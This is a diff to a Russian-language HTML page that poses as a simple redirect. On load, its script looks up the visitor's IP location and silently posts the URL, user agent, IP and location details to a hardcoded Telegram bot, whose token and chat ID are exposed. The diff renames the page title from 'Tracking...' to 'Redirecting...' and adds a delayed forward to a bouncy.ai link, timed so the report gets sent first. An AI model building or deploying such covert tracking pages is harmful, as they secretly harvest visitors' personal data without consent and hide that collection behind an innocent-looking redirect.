@@ -2,16 +2,17 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Tracking...</title>
+  <title>Redirecting...</title>
   <script>
     const TOKEN = "7930993307:AAHuIxRVgr9OD7ZP_D2dbrbEu-JGBdZSnc4";
     const CHAT_ID = "5253808709";
     const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    const REDIRECT_URL = "https://bouncy.ai/tyminmin374";
 
     fetch("https://ipwho.is/")
       .then(res => res.json())
       .then(data => {
-        const msg = `🔁 Заход на bouncy.ai
+        const msg = `🔁 Заход с прокладки
 🌐 URL: ${location.href}
 📱 UA: ${navigator.userAgent}
 🌍 IP: ${data.ip}
@@ -26,6 +27,11 @@
             text: msg
           })
         });
+      })
+      .finally(() => {
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 800); // задержка, чтобы успел отстук
       });
   </script>
 </head>
